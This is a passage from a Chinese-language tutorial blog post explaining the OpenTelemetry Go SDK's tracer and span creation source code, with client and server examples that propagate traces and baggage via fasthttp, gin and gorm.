	gw, gctx := errgroup.WithContext(spanCtx)
	gw.Go(<span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> <span class="hljs-type">error</span> {
		funcA(gctx)
		<span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>
	})
	gw.Go(<span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> <span class="hljs-type">error</span> {
		funcB(gctx)
		<span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>
	})
	
	_ = gw.Wait()
    <span class="hljs-comment">// 一定是等协程执行完了 才把 主的 span 关闭</span>
	span.End()

}

</code></pre>
<h2 data-id="heading-2">运行效果</h2>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d75838aceaee4ab19c84a333e38e7fdc~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5LiL5qyh5LiA5a6aNTc=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770888385&amp;x-signature=7YGmvdsu0yvsWhXH3IUCVchb27w%3D" alt="在这里插入图片描述" loading="lazy"/></p>
<h2 data-id="heading-3">核心逻辑讲解</h2>
<h3 data-id="heading-4"><code>otel.Tracer("basic_name")</code> 核心函数</h3>
<p>在有些中间件，或者大型项目在用的时候可能没有用 <code>otel.Tracer()</code> 函数，而是先 <code>GetTracerProvider()</code> 获得全局的 <code>tp</code></p>
<p>然后在执行 <code>tp.Tracer("basic_name")</code>，大家知道我们用  <code>SetTracerProvider(...)</code> 去放进去，这个时候在去取</p>
<p>跟 <code>otel.Tracer("basic_name")</code> 这个是等价的，如下代码其实就是帮我们在这么做</p>
<pre><code class="hljs language-go" lang="go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">Tracer</span><span class="hljs-params">(name <span class="hljs-type">string</span>, opts ...trace.TracerOption)</span></span> trace.Tracer {
	<span class="hljs-keyword">return</span> GetTracerProvider().Tracer(name, opts...)
}

<span class="hljs-comment">// 详细解读 内部逻辑 这就是我们放上去的 tp </span>
<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(p *TracerProvider)</span></span> Tracer(name <span class="hljs-type">string</span>, opts ...trace.TracerOption) trace.Tracer {
	<span class="hljs-keyword">if</span> p.isShutdown.Load() {  <span class="hljs-comment">// 是否关闭</span>
		<span class="hljs-keyword">return</span> noop.NewTracerProvider().Tracer(name, opts...)
	}
    <span class="hljs-comment">// 这个 opt... 解包的 TracerOption 这个类型 我们没有传  就是 nil 这条语句就是初始化一下 就全是空</span>
	c := trace.NewTracerConfig(opts...)
    
	<span class="hljs-keyword">if</span> name == <span class="hljs-string">""</span> {   <span class="hljs-comment">//防止没有name 这里我们有</span>
		name = defaultTracerName
	}
    <span class="hljs-comment">// 这里是 核心 用于唯一标识一个 Tracer 示例，以我们例子来看 除了name 全空</span>
	is := instrumentation.Scope{
		Name:       name,
		Version:    c.InstrumentationVersion(),
		SchemaURL:  c.SchemaURL(),
		Attributes: c.InstrumentationAttributes(),
	}

	t, ok := <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> (trace.Tracer, <span class="hljs-type">bool</span>) {
        <span class="hljs-comment">// 再次检查 是因为 如果在生成 is 的时候 关了这里再执行就会有问题</span>
		p.mu.Lock()
		<span class="hljs-keyword">defer</span> p.mu.Unlock()
        
		<span class="hljs-keyword">if</span> p.isShutdown.Load() {
			<span class="hljs-keyword">return</span> noop.NewTracerProvider().Tracer(name, opts...), <span class="hljs-literal">true</span>
		}
        <span class="hljs-comment">// 判断一下 我们这个 is 在不在我们这个map中。如果在我们就复用，如果不在，我们就新建一个实例存入map</span>
        <span class="hljs-comment">// 所以说 is 是 唯一标识一个实例的</span>
		t, ok := p.namedTracer[is]
		<span class="hljs-keyword">if</span> !ok {
           	<span class="hljs-comment">// 第一次没有 </span>
			t = &amp;tracer{
				provider:             p,  <span class="hljs-comment">//父引用 p 就是 TracerProvider</span>
				instrumentationScope: is,  <span class="hljs-comment">// 自己的唯一标识</span>
			}

			<span class="hljs-keyword">var</span> err <span class="hljs-type">error</span>
            <span class="hljs-comment">// 创建一个指标采集的自定义 Tracer 实例  如果全局可观测性开关未开启，则直接返回空实例，不执行任何指标创建逻辑</span>
            <span class="hljs-comment">// 这是关于监控相关的事情，可后续学习</span>
			t.inst, err = observ.NewTracer()
			<span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> {
				otel.Handle(err)
			}
			<span class="hljs-comment">// 存入</span>
			p.namedTracer[is] = t
		}
		<span class="hljs-keyword">return</span> t, ok
	}()
	<span class="hljs-keyword">if</span> !ok {
		<span class="hljs-comment">// 这个的意思 第一次或者没找到，新建了 打个日志</span>
		global.Info(
			<span class="hljs-string">"Tracer created"</span>,
			<span class="hljs-string">"name"</span>,
			name,
			<span class="hljs-string">"version"</span>,
			is.Version,
			<span class="hljs-string">"schemaURL"</span>,
			is.SchemaURL,
			<span class="hljs-string">"attributes"</span>,
			is.Attributes,
		)
	}
	<span class="hljs-keyword">return</span> t
}
</code></pre>
<h3 data-id="heading-5"><code>tr.Start(ctx, "func-main")</code> 函数</h3>
<p>这个时候才是真正去生成 <code>TracerID</code> 和 <code>SpanID</code></p>
<pre><code class="hljs language-go" lang="go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(tr *tracer)</span></span> Start(ctx context.Context, name <span class="hljs-type">string</span>, options ...trace.SpanStartOption,
) (context.Context, trace.Span) {
    <span class="hljs-comment">// 这里正常也是 空 我们都没放东西，该配置主要预留给框架/中间件使用，用于在 Span 创建阶段注入</span>
    <span class="hljs-comment">// 比如中间件会在此阶段注入 SpanKind、Attributes、Links 等，后续大家会明白</span>
	config := trace.NewSpanStartConfig(options...)
	
    <span class="hljs-comment">// 不走 这是兜底判断</span>
	<span class="hljs-keyword">if</span> ctx == <span class="hljs-literal">nil</span> {
		ctx = context.Background()
	}
	<span class="hljs-comment">// 这个是重点 后续有源码 作用就是查找 ctx 里有没有父 span</span>
	<span class="hljs-keyword">if</span> p := trace.SpanFromContext(ctx); p != <span class="hljs-literal">nil</span> {
        <span class="hljs-comment">// 这里就是巧妙的用断言去判断是否有 父 span</span>
		<span class="hljs-keyword">if</span> sdkSpan, ok := p.(*recordingSpan); ok {
            <span class="hljs-comment">// 有 TODO</span>
			sdkSpan.addChild()
		}
	}
	
    <span class="hljs-comment">// 核心 无论有没有都会走这个 简单来讲就是 TracerID 复用 SpanID 要新建</span>
	s := tr.newSpan(ctx, name, &amp;config)
    <span class="hljs-comment">// 这里逻辑是最重要的 用于 保存父 Span 使得链路可以延续   代码我放到下面 补充</span>
    <span class="hljs-comment">// 而且大家有个误区 就是去拿 父 Span 是拿根的么？ 大家可以思考一下  给出结果</span>
    <span class="hljs-comment">/*
    由于每次 start 都会执行这个函数 trace.ContextWithSpan(ctx, s) 新建一个ctx1继承了之前的 ctx 的所有其他键值对
    但覆盖了 currentSpanKey 对应的值  如果是main 调用 funA 然后 funA 再调用 funB 的话 调用链如下
    main 调用 Start：创建根 span（s0），返回ctx1
	funA 调用 Start（传入 ctx1）：创建子 span（s1，父为 s0），返回ctx2
	funB 调用 Start（传入 ctx2）：创建子 span（s2，父为 s1），返回ctx3
	在我们的例子中：
	main 调用 Start：创建根 span（s0），返回ctx1
	funA 调用 Start（传入 ctx1）：创建子 span（s1，父为 s0），返回ctx2
	funB 调用 Start（也是传入 ctx1）：创建子 span（s2，父为 s0），返回ctx3
	funA 和 funB 是平级的
	希望大家可以从我讲解的代码上，
    */</span>
	newCtx := trace.ContextWithSpan(ctx, s)
    <span class="hljs-comment">// 同理 用于统计和监控</span>
	<span class="hljs-keyword">if</span> tr.inst.Enabled() {
		<span class="hljs-keyword">if</span> o, ok := s.(<span class="hljs-keyword">interface</span>{ setOrigCtx(context.Context) }); ok {
			o.setOrigCtx(newCtx)
		}
		psc := trace.SpanContextFromContext(ctx)
		tr.inst.SpanStarted(newCtx, psc, s)
	}
    
	<span class="hljs-comment">// 大家应该清楚 真正 实现链路追踪的是 内部的 SpanProcessor 也就是我们注册的 Jaeger 或者 Zipkin</span>
    <span class="hljs-comment">// 初始化时讲解过可以有多个SpanProcessor，存在一个列表中 这个时候真正开始让底层开始初始化</span>
	<span class="hljs-keyword">if</span> rw, ok := s.(ReadWriteSpan); ok &amp;&amp; s.IsRecording() {
		sps := tr.provider.getSpanProcessors()
		<span class="hljs-keyword">for</span> _, sp := <span class="hljs-keyword">range</span> sps {
            <span class="hljs-comment">// 这里就是 Jaeger.OnStart(ctx, rw) 或者 Zipkin.OnStart(ctx, rw)</span>
			sp.sp.OnStart(ctx, rw)
		}
	}
    <span class="hljs-comment">// 不重要</span>
	<span class="hljs-keyword">if</span> rtt, ok := s.(runtimeTracer); ok {
		newCtx = rtt.runtimeTrace(newCtx)
	}

    <span class="hljs-comment">// 返回</span>
	<span class="hljs-keyword">return</span> newCtx, s
}


<span class="hljs-comment">// 补充</span>
<span class="hljs-keyword">type</span> traceContextKeyType <span class="hljs-type">int</span>
<span class="hljs-keyword">const</span> currentSpanKey traceContextKeyType = <span class="hljs-literal">iota</span>

<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">ContextWithSpan</span><span class="hljs-params">(parent context.Context, span Span)</span></span> context.Context {
    <span class="hljs-comment">// 下个再来找就可以找到</span>
	<span class="hljs-keyword">return</span> context.WithValue(parent, currentSpanKey, span)
}

</code></pre>
<h3 data-id="heading-6"><code>SpanFromContext(ctx context.Context) </code> 函数</h3>
<p>这里返回的 <code>noopSpanInstance</code> 是官方刻意设计用于程序正常执行的，可以把它理解成 <code>nil</code> ，如果官方用<code>nil</code> 的话，会在很多地方去判断是否是<code>nil</code>，代码量激增，核心代码被埋没别人也没心情去看，再用断言的形式判断，从而到底返回的是什么</p>
<pre><code class="hljs language-go" lang="go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">SpanFromContext</span><span class="hljs-params">(ctx context.Context)</span></span> Span {
	<span class="hljs-keyword">if</span> ctx == <span class="hljs-literal">nil</span> {
		<span class="hljs-keyword">return</span> noopSpanInstance
	}
    <span class="hljs-comment">// 这里如果大家看过我之前文章或者 context 源码，大家会清楚的知道 这就是递归的去找有没有这个 key，value</span>
    <span class="hljs-comment">// 从自己开始一直找到最开始的根，这里如果找到了说明链路的头已经被创建，也就是已经存在 TracerID，要复用这个 要不断链</span>
	<span class="hljs-keyword">if</span> span, ok := ctx.Value(currentSpanKey).(Span); ok {
		<span class="hljs-keyword">return</span> span
	}
    <span class="hljs-comment">// 这里就是没找到 符合我们第一次 start</span>
	<span class="hljs-keyword">return</span> noopSpanInstance
}
</code></pre>
<h3 data-id="heading-7"><code>tr.newSpan(ctx, name, &amp;config)</code> 函数</h3>
<pre><code class="hljs language-go" lang="go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(tr *tracer)</span></span> newSpan(ctx context.Context, name <span class="hljs-type">string</span>, config *trace.SpanConfig) trace.Span {
    
	<span class="hljs-keyword">var</span> psc trace.SpanContext
    <span class="hljs-comment">// 判断是否选择断链  正常情况都不断，默认也是不断  有些情况 比如 消息补偿	不信任上游 可以设置</span>
	<span class="hljs-keyword">if</span> config.NewRoot() {
		ctx = trace.ContextWithSpanContext(ctx, psc)
	} <span class="hljs-keyword">else</span> {
        <span class="hljs-comment">// 大部分走这一步  后续有代码</span>
		psc = trace.SpanContextFromContext(ctx)
	}


	<span class="hljs-keyword">var</span> tid trace.TraceID
	<span class="hljs-keyword">var</span> sid trace.SpanID
    <span class="hljs-comment">// 拿到之后 判断一下 TraceID有么 其实就是 上一步返回空说明没有根Span，就生成 TraceID 和 SpanID 如果有了根 走else</span>
    <span class="hljs-comment">// 这里的生成器在之前的源码讲解中，初始化过，也可以自己传，一般都是用默认</span>
	<span class="hljs-keyword">if</span> !psc.TraceID().IsValid() {
        <span class="hljs-comment">// 生成 TraceID 和 SpanID</span>
		tid, sid = tr.provider.idGenerator.NewIDs(ctx)
	} <span class="hljs-keyword">else</span> {
        <span class="hljs-comment">// 这里 复用 根的 TraceID 确保不断链 生成自己的 SpanID</span>
		tid = psc.TraceID()
		sid = tr.provider.idGenerator.NewSpanID(ctx, tid)
	}
	
    <span class="hljs-comment">// 这是采样决策相关的 </span>
	samplingResult := tr.provider.sampler.ShouldSample(SamplingParameters{
		ParentContext: ctx,
		TraceID:       tid,
		Name:          name,
		Kind:          config.SpanKind(),  		 <span class="hljs-comment">//中间件相关</span>
		Attributes:    config.Attributes(),		<span class="hljs-comment">//中间件相关</span>
		Links:         config.Links(),		<span class="hljs-comment">//中间件相关</span>
	})
	
    <span class="hljs-comment">// 重要！！！ 构造 SpanContext 的配置 第一次的话 肯定要让下一个知道这个是根 防止断链</span>
	scc := trace.SpanContextConfig{
		TraceID:    tid,
		SpanID:     sid,
		TraceState: samplingResult.Tracestate, 
	}
    
    <span class="hljs-comment">// 之前花了时间在如何采样上 这里就是用讲过的算法判断是否采样</span>
	<span class="hljs-keyword">if</span> isSampled(samplingResult) {
		scc.TraceFlags = psc.TraceFlags() | trace.FlagsSampled
	} <span class="hljs-keyword">else</span> {
		scc.TraceFlags = psc.TraceFlags() &amp;^ trace.FlagsSampled
	}
    <span class="hljs-comment">// 这里是通过上面的配置生成 SpanContext 重点是在 return 的函数去生成 span（接口） 结构体是：RecordingSpan</span>
    <span class="hljs-comment">// 这个RecordingSpan 里面有字段 SpanContext 重点 就是从这创建的 以后拿的时候不再是空 而是有东西的</span>
	sc := trace.NewSpanContext(scc)
	
    <span class="hljs-comment">// 这里就是不采样 那就走这个 return 因为都不选择采样了 就返回一个 轻量级的 Span 只有 traceID 和 SpanID 就可以</span>
    <span class="hljs-comment">// 节省空间 几乎零开销，在高并发的场景 大部分都是10%的采样 如果没有轻量级记录 内存会被压垮</span>
	<span class="hljs-keyword">if</span> !isRecording(samplingResult) {
		<span class="hljs-keyword">return</span> tr.newNonRecordingSpan(sc)
	}
    <span class="hljs-comment">// 顾名思义 创建一个活着的或者说可以记录的 Span   可以存储事件，有着各种属性</span>
	<span class="hljs-keyword">return</span> tr.newRecordingSpan(ctx, psc, sc, name, samplingResult, config)
}
</code></pre>
<h3 data-id="heading-8"><code>trace.SpanContextFromContext(ctx)</code> 函数</h3>
<p>内部就是<code>SpanFromContext(ctx).SpanContext()</code> 调用了上面讲过的函数，拿到之后用到它的 <code>SpanContext</code>  字段</p>
<p>如果是第一次也就是返回 <code>noopSpanInstance</code>拿到的  <code>SpanContext</code>   也是空结构体</p>
<p>这里主要讲一下第二次也就是 <code>funcA(gctx)</code>函数中 调用后，<code>main</code> 函数已经创建好主 <code>Span</code> 那它执行这个是怎么样的</p>
<pre><code class="hljs language-go" lang="go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">SpanContextFromContext</span><span class="hljs-params">(ctx context.Context)</span></span> SpanContext {
    <span class="hljs-comment">// 这里结合上面 对 trace.NewSpanContext(scc) 的注释 再来看这个代码 如果是第一次 那就是空没啥意义</span>
    <span class="hljs-comment">// 第二次的话 就能拿到这个 span 也就是 SpanFromContext(ctx) 返回的 这个span 真实是 RecordingSpan</span>
    <span class="hljs-comment">// RecordingSpan 他的一个方法 SpanContext() 就是直接返回 他的字段 RecordingSpan.SpanContext 就是上面创建的</span>
	<span class="hljs-keyword">return</span> SpanFromContext(ctx).SpanContext()
}

<span class="hljs-comment">// 返回的字段 在 trace.NewSpanContext(scc) 函数 中可以看到</span>
</code></pre>
<h3 data-id="heading-9"><code>trace.NewSpanContext(scc)</code> 函数</h3>
<p>主要了解一下它的字段，TODO</p>
<pre><code class="hljs language-go" lang="go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">NewSpanContext</span><span class="hljs-params">(config SpanContextConfig)</span></span> SpanContext {
	<span class="hljs-keyword">return</span> SpanContext{
		traceID:    config.TraceID,    <span class="hljs-comment">// 整条调用链的唯一 ID（一条 trace 只有一个）</span>
		spanID:     config.SpanID,     <span class="hljs-comment">// 当前这个 span 自己的 ID（每个 span 都不一样）</span>
		traceFlags: config.TraceFlags, <span class="hljs-comment">// 一些“状态位”，最重要的是：采不采样</span>
		traceState: config.TraceState, <span class="hljs-comment">// 跨厂商透传的额外信息</span>
        <span class="hljs-comment">// 这个 span 是不是从“远端”来的 如果是 RPC通讯 并不是在我这个主机上创建的，那就为 True</span>
        <span class="hljs-comment">// 如果是本机创建的，我们基础的例子，都是我们这个进程自己创建的，并没有跨主机进行通讯 那就为 False</span>
        <span class="hljs-comment">// 当上游 Http 创建 Span 请求我们的后端 我们后端拿到的就是 远程的 Span</span>
		remote:     config.Remote,     
	}
}
</code></pre>
<h3 data-id="heading-10"><code>tr.newRecordingSpan(ctx, psc, sc, name, samplingResult, config)</code> 函数</h3>
<p>这里主要是创建可记录的 <code>Span</code> 这边返回后，就回到了主逻辑 <code>tr.Start()</code> 函数，返回阅读</p>
<pre><code class="hljs language-go" lang="go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(tr *tracer)</span></span> newRecordingSpan(ctx context.Context, psc, sc trace.SpanContext, name <span class="hljs-type">string</span>,
	sr SamplingResult,
	config *trace.SpanConfig,
) *recordingSpan {  <span class="hljs-comment">// 返回类型   *recordingSpan</span>
    <span class="hljs-comment">// 可以传递时间 这样也可以把时间算进来</span>
	startTime := config.Timestamp()
	<span class="hljs-keyword">if</span> startTime.IsZero() {
		startTime = time.Now()
	}
	<span class="hljs-comment">// 要返回的 NewSpan</span>
	s := &amp;recordingSpan{
		parent:      psc,   <span class="hljs-comment">// 父 span</span>
		spanContext: sc,   <span class="hljs-comment">// 当前 Span</span>
		spanKind:    trace.ValidateSpanKind(config.SpanKind()),  <span class="hljs-comment">// 中间件可能用到</span>
		name:        name,   <span class="hljs-comment">// span 名字  比如 main funA 自己传的</span>
		startTime:   startTime,
        <span class="hljs-comment">// 这个很有用 自己在业务中存一些 事件 后续进阶例子我们会用到，记住在这存储了就好 </span>
        <span class="hljs-comment">// 而且为了防止有人恶意存上千个，这里有限制，默认最多 128 个 在初始化 tp 的时候设置的</span>
		events:      newEvictedQueueEvent(tr.provider.spanLimits.EventCountLimit), 
        <span class="hljs-comment">// // 中间件可能用到</span>
		links:       newEvictedQueueLink(tr.provider.spanLimits.LinkCountLimit),
        <span class="hljs-comment">// 反向保存 tracer，后面 End() 要用</span>
		tracer:      tr,
	}
	<span class="hljs-comment">// 了解</span>
	<span class="hljs-keyword">for</span> _, l := <span class="hljs-keyword">range</span> config.Links() {
		s.AddLink(l)
	}
	<span class="hljs-comment">// 这里是第三方的 一些 key value 对</span>
	s.SetAttributes(sr.Attributes...)
    <span class="hljs-comment">// 这里是添加用户或者中间件传来的 一些 key value 对 （后续进阶例子也会用到）</span>
	s.SetAttributes(config.Attributes()...)
	
    <span class="hljs-comment">// 这个是 可观测性开关 默认不开启 这个逻辑不走 直接 return</span>
	<span class="hljs-keyword">if</span> tr.inst.Enabled() {
		ctx = trace.ContextWithSpan(ctx, s)
		tr.inst.SpanLive(ctx, s)
	}

	<span class="hljs-keyword">return</span> s
}
</code></pre>
<h2 data-id="heading-11">跨服务全链路整合（<code>Gin</code> / <code>Gorm</code> / <code>Fasthttp</code> 生态对接）</h2>
<h3 data-id="heading-12">客户端部分</h3>
<p>方便测试这里使用 <code>fasthttp</code>只是为了模拟跨服务或者跨网段的链路追踪，由于我们学到了初始化的源码和链路追踪的源码，这时候再看一些中间件或者大型项目的链路追踪源码，就明白是如何连接起来了</p>
<p>重点介绍了我们注册的 <code>Propagator</code> （传播器），最重要的 <code>Inject</code> 和 <code>Extract</code> 方法，这是跨服务进行链路追踪和核心</p>
<p>并使用了 <code>baggage</code> 传播我们自己想传的逻辑，补充一下，我们注册的是：
<code>SetTextMapPropagator(propagation.NewCompositeTextMapPropagator(propagation.TraceContext{}, propagation.Baggage{}))</code></p>
<p>第一个主要就是传送 <code>TraceID</code> 和 <code>SpanID</code>  ，一般不会用它传递其他的，防止污染</p>
<p>在 <code>Inject</code>  的时候 它是可以支持 <code>p.Inject(Newctx, propagation.MapCarrier(headers))</code> 这个  <code>headers</code> 前提是 <code>http.headers</code></p>
<p>但由于我们用的是<code>fasthttp</code> 所以我们需要转换一下，这里告诉大家，如果是正常写项目，直接放入即可</p>
<pre><code class="hljs language-go" lang="go"><span class="hljs-keyword">package</span> main

<span class="hljs-keyword">import</span> (
	<span class="hljs-string">"context"</span>
	<span class="hljs-string">"go.opentelemetry.io/otel/baggage"</span>
	<span class="hljs-string">"golang.org/x/sync/errgroup"</span>
	<span class="hljs-string">"time"</span>

	<span class="hljs-string">"github.com/valyala/fasthttp"</span>
	<span class="hljs-string">"go.opentelemetry.io/otel"</span>
	<span class="hljs-string">"go.opentelemetry.io/otel/attribute"</span>
	<span class="hljs-string">"go.opentelemetry.io/otel/propagation"</span>
)

<span class="hljs-comment">// 这里 简单协程 证明 链路 funcC 和 funcD 链路是同级</span>
<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">funcC</span><span class="hljs-params">(ctx context.Context)</span></span> {
	tr := otel.Tracer(<span class="hljs-string">"basic_name"</span>)
	_, span := tr.Start(ctx, <span class="hljs-string">"func-C"</span>)
	span.SetAttributes(attribute.String(<span class="hljs-string">"FuncC的测试key"</span>, <span class="hljs-string">"内部key，不可传递"</span>))
	time.Sleep(time.Second)
	span.End()
}

<span class="hljs-comment">// 重点 这里面 是 用 fasthttp 发送请求 携带链路数据以及自己想发的业务数据  比如 userid (可选)</span>
<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">funcD</span><span class="hljs-params">(ctx context.Context)</span></span> {
	tr := otel.Tracer(<span class="hljs-string">"basic_name"</span>)
    <span class="hljs-comment">// start 才是真正 拿到 TraceID 找到链路 所以必须传 ctx 不懂可以回去看源码</span>
	spanCtx, span := tr.Start(ctx, <span class="hljs-string">"func-D"</span>)
    <span class="hljs-comment">// 这里给大家展示了 如果创建 baggage 数据 如何塞入 如果你想传的很多，比如是结构体 </span>
    <span class="hljs-comment">// 那完全可以 json 序列化成 []byte 然后放入 在业务端 在反序列化</span>
	userID, _ := baggage.NewMember(<span class="hljs-string">"user.id"</span>, <span class="hljs-string">"10001"</span>)
	userRole, _ := baggage.NewMember(<span class="hljs-string">"user.role"</span>, <span class="hljs-string">"1"</span>)
    <span class="hljs-comment">// 可以一下 塞多个</span>
	bag, _ := baggage.New(userID, userRole)
    <span class="hljs-comment">// 这就是 放入 ctx 和 我们生成的数据 返回一个新的 ctx 这个 ctx 包含之前的也有生成的数据</span>
	Newctx := baggage.ContextWithBaggage(spanCtx, bag)
	time.Sleep(time.Second)
    <span class="hljs-comment">// 新建请求</span>
	req := fasthttp.AcquireRequest()
	<span class="hljs-keyword">defer</span> fasthttp.ReleaseRequest(req)  <span class="hljs-comment">//防止泄露 关闭</span>
	req.SetRequestURI(<span class="hljs-string">"http://127.0.0.1:8090/server"</span>)
	req.Header.SetMethod(<span class="hljs-string">"GET"</span>)
	<span class="hljs-comment">//重点 获取 我们传入的 Propagator</span>
	p := otel.GetTextMapPropagator()
    
	<span class="hljs-comment">// 这个要注意 ！！！  由于类型不匹配 只能新建一个 map 然后注入值之后 再把值给到 req.Header</span>
	headers := <span class="hljs-built_in">make</span>(<span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-type">string</span>)
	p.Inject(Newctx, propagation.MapCarrier(headers))
	<span class="hljs-keyword">for</span> key, value := <span class="hljs-keyword">range</span> headers {
		req.Header.Set(key, value)
	}

	fclient := fasthttp.Client{}
	fres := fasthttp.Response{}
	<span class="hljs-comment">// 隐藏错误</span>
	_ = fclient.Do(req, &amp;fres)

	span.End()
}

<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> {

	tp, _ := common.InitTracerProvider(common.Options{
		Name:     <span class="hljs-string">"basic_name"</span>,
		Endpoint: <span class="hljs-string">"http://192.168.163.132:14268/api/traces"</span>,
		Sampler:  <span class="hljs-number">1</span>,
		Batcher:  <span class="hljs-string">"jaeger"</span>,
	})

	ctx, cancel := context.WithCancel(context.Background())
    <span class="hljs-comment">// 一样需要关闭 然后 tp 就会把攒的那些 trace 发送出去</span>
	<span class="hljs-keyword">defer</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(ctx context.Context)</span></span> {
		ctx, cancel = context.WithTimeout(ctx, time.Second*<span class="hljs-number">5</span>)
		<span class="hljs-keyword">defer</span> cancel()
		<span class="hljs-keyword">if</span> err := tp.Shutdown(ctx); err != <span class="hljs-literal">nil</span> {
			<span class="hljs-built_in">panic</span>(err)
		}
	}(ctx)

	tr := otel.Tracer(<span class="hljs-string">"basic_name"</span>)
    <span class="hljs-comment">// 新建根 span</span>
	spanCtx, span := tr.Start(ctx, <span class="hljs-string">"func-main"</span>)

	gw, gctx := errgroup.WithContext(spanCtx)
	gw.Go(<span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> <span class="hljs-type">error</span> {
		funcC(gctx)
		<span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>
	})
	gw.Go(<span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> <span class="hljs-type">error</span> {
		funcD(gctx)
		<span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>
	})

	_ = gw.Wait()
	span.End()
}

</code></pre>
<h3 data-id="heading-13">Server 端部分</h3>
<p>这里给大家讲解 <code>Server </code> 端读取链路拿到 <code>baggage</code> 数据，并且使用 <code>gin </code> 官方支持的 <code>Opentelemetry</code> 中间件 还有 <code>grom</code> 支持的</p>
<p>并附带部分源码，如果在清楚上面讲过的源码基础上，下面源码理解起来非常简单</p>
<pre><code class="hljs language-go" lang="go"><span class="hljs-keyword">package</span> main

<span class="hljs-keyword">import</span> (
	<span class="hljs-string">"Advanced_Shop/test/telemetry/ch03/server/model"</span>
	<span class="hljs-string">"Advanced_Shop/test/telemetry/ch04/common"</span>
	<span class="hljs-string">"fmt"</span>
	<span class="hljs-string">"github.com/gin-gonic/gin"</span>
	<span class="hljs-string">"go.opentelemetry.io/otel"</span>
	<span class="hljs-string">"go.opentelemetry.io/otel/baggage"</span>
	<span class="hljs-string">"go.opentelemetry.io/otel/propagation"</span>

	<span class="hljs-string">"go.opentelemetry.io/otel/sdk/trace"</span>
	<span class="hljs-string">"gorm.io/driver/mysql"</span>
	<span class="hljs-string">"gorm.io/gorm"</span>
	<span class="hljs-string">"gorm.io/gorm/schema"</span>
	<span class="hljs-string">"time"</span>

	<span class="hljs-string">"go.opentelemetry.io/contrib/instrumentation/github.com/gin-gonic/gin/otelgin"</span>
	<span class="hljs-string">"gorm.io/plugin/opentelemetry/tracing"</span>
)
<span class="hljs-comment">// 大家这里应该明白一件事情，由于main函数初始化的，想要其他函数使用，必须定义成全局变量，而且如果你的请求处理分布在不同包中，直接使用全局变量会增加耦合度。对于他的并发安全使用也是麻烦，所以大家最好使用 option 选项模式，可以看一下之前的文章</span>
<span class="hljs-keyword">var</span> tp *trace.TracerProvider

<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">Server</span><span class="hljs-params">(c *gin.Context)</span></span> {
	<span class="hljs-comment">// 拿到 context 是client端注入东西的 Context</span>
	ctx := c.Request.Context()
	propagator := otel.GetTextMapPropagator()
	tr := tp.Tracer(<span class="hljs-string">"basic_name"</span>)
    <span class="hljs-comment">// 提取出来 就知道链路 TraceID 和 baggage 数据 </span>
	sctx := propagator.Extract(ctx, propagation.HeaderCarrier(c.Request.Header))
    <span class="hljs-comment">// 创建子链路</span>
	spanCtx, span := tr.Start(sctx, <span class="hljs-string">"server"</span>)
	<span class="hljs-keyword">defer</span> span.End()
    <span class="hljs-comment">//从中拿到 baggage 数据 并 打印</span>
	bag := baggage.FromContext(sctx)
	userID := bag.Member(<span class="hljs-string">"user.id"</span>).Value()
	fmt.Println(userID)   <span class="hljs-comment">// 10001</span>
	
    <span class="hljs-comment">// 这里给大家介绍 gorm 中的 链路追踪 所以 这里建了一个新数据库和新表 只是用于 到时看结果</span>
	dsn := <span class="hljs-string">"root:root@tcp(127.0.0.1:3306)/user-srv?charset=utf8mb4&amp;parseTime=True&amp;loc=Local"</span>
	db, err := gorm.Open(mysql.Open(dsn), &amp;gorm.Config{
		NamingStrategy: schema.NamingStrategy{
			SingularTable: <span class="hljs-literal">true</span>,
		},
	})
	<span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> {
		<span class="hljs-built_in">panic</span>(err)
	}
    
	<span class="hljs-comment">// 这是重点 使用这个插件  用法与 gin的中间件差不多 tracing.NewPlugin() 后续有源码解读</span>
	<span class="hljs-keyword">if</span> err := db.Use(tracing.NewPlugin()); err != <span class="hljs-literal">nil</span> {
		<span class="hljs-built_in">panic</span>(err)
	}
	<span class="hljs-comment">// 这个时候使用数据库的时候 WithContext(spanCtx) 是最关键的 </span>
	<span class="hljs-keyword">if</span> err := db.WithContext(spanCtx).Model(model.UserModels{}).Where(<span class="hljs-string">"id = ?"</span>, <span class="hljs-number">1</span>).First(&amp;model.UserModels{}).Error; err != <span class="hljs-literal">nil</span> {
		<span class="hljs-built_in">panic</span>(err)
	}
	time.Sleep(<span class="hljs-number">500</span> * time.Millisecond)
	c.JSON(<span class="hljs-number">200</span>, gin.H{})
}


<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> {
	tp, _ = common.InitTracerProvider(common.Options{
		Name:     <span class="hljs-string">"basic_name"</span>,
